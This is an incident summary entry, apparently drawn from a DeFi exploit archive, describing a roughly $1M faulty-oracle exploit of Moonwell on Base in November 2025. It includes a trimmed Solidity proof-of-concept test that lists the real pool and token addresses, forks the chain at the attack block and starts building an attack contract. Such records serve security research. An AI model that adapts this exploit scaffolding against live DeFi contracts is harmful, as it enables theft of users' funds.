# [?] Moonwell - Faulty Oracle

## Summary
Severity: Unknown
Chain: Base
Component: Moonwell
Published: 2025-11-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-11/Moonwell_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1M USD
References:
- https://x.com/CertiKAlert/status/1985620452992253973
- https://finance.yahoo.com/news/moonwell-hack-1m-lost-chainlink-123012371.html
- https://www.halborn.com/blog/post/explained-the-moonwell-hack-november-2025

```solidity
contract ContractTest is Test {
    // Pools
    address constant CLPOOL_WSTETH_WRSETH = 0x14dcCDd311Ab827c42CCA448ba87B1ac1039e2A4;
    address constant CLPOOL_WSTETH_WETH   = 0x861A2922bE165a5Bd41b1E482B49216b465e1B5F;
    address constant V3POOL_WRSETH_WETH  = 0x16e25fAcBA67a40dA3436ab9E2E00C30daB0dD97;

    // Tokens
    address constant WRSETH = 0xEDfa23602D0EC14714057867A78d01e94176BEA0; // rsETHWrapper (wrsETH) on Base
    address constant MW_RSETH = 0xfC41B49d064Ac646015b459C522820DB9472F4B5; // Moonwell mwrsETH cToken
    address constant MW_STETH = 0x627Fe393Bc6EdDA28e99AE648fD6fF362514304b;
    address constant WSTETH = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;  // wstETH on Base
    address constant WETH   = 0x4200000000000000000000000000000000000006;  // canonical WETH on Base

    // Moonwell Comptroller (Unitroller)
    address constant COMPTROLLER = 0xfBb21d0380beE3312B33c4353c8936a0F13EF26C;

    uint256 constant BLOCK = 37722882 - 1;

    AttackContract attacker;

    function setUp() public {
        vm.createSelectFork("base", BLOCK);
        vm.label(V3POOL_WRSETH_WETH, "UniswapV3Pool");
        vm.label(WRSETH, "wrsETH");
        vm.label(MW_RSETH, "mwrsETH");                
        vm.label(MW_STETH, "mwstETH");
        vm.label(WSTETH, "0xc1cb_wstETH");
        vm.label(WETH, "WETH");
        
        attacker = new AttackContract(
            CLPOOL_WSTETH_WRSETH,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-11/Moonwell_exp.sol_
